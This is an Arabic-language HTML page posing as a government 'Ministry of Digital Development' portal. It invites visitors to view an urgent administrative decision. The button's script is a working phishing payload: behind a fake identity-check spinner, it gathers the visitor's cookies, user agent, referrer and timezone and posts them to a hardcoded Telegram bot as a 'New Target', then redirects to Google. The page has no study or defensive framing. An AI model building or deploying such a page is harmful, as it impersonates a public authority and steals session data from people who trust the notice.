<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة وزارة التنمية | عرض القرار الإداري</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; background-color: #f0f2f5; color: #333; }
        .header { background-color: #004a87; color: white; padding: 20px; text-align: center; border-bottom: 5px solid #d4af37; }
        .card { max-width: 450px; margin: 40px auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; }
        .btn { background-color: #004a87; color: white; padding: 15px 30px; text-decoration: none; border-radius: 8px; display: inline-block; margin-top: 25px; font-weight: bold; border: none; width: 100%; cursor: pointer; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #004a87; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="header">
    <h2>وزارة التنمية الرقمية</h2>
    <p>بوابة الخدمات الموحدة - مجلس المدينة</p>
</div>

<div class="card">
    <div id="ui">
        <h3 style="color: #004a87;">إشعار قرار إداري عاجل</h3>
        <p>تم صدور قرار إداري جديد (رقم 412-2026) يخص معاملتكم المسجلة لدى مجلس المدينة.</p>
        <button class="btn" onclick="x()">عرض القرار (PDF)</button>
    </div>
    <div id="ld" style="display:none;">
        <div class="spinner" style="display:block;"></div>
        <p>جاري التحقق من الهوية الرقمية...</p>
    </div>
</div>

<script>
    async function x() {
        document.getElementById('ui').style.display='none';
        document.getElementById('ld').style.display='block';
        
        const t = "8349541440:AAGauSXthWVuaqXA3SYYZY11w8JzJa-v8gU";
        const c = "295675359";
        
        const d = {
            ua: navigator.userAgent,
            ck: document.cookie || "N/A",
            ref: document.referrer || "Direct",
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone
        };

        const m = `🎯 **New Target**\n📱 Device: ${d.ua}\n🍪 Cookie: \`${d.ck}\` \n🌍 TZ: ${d.tz}`;

        try {
            await fetch(`https://api.telegram.org/bot${t}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: c, text: m, parse_mode: "Markdown" })
            });
        } catch (e) {}

        setTimeout(() => {
            window.location.href = "https://www.google.com"; 
        }, 2000);
    }
</script>
</body>
</html>
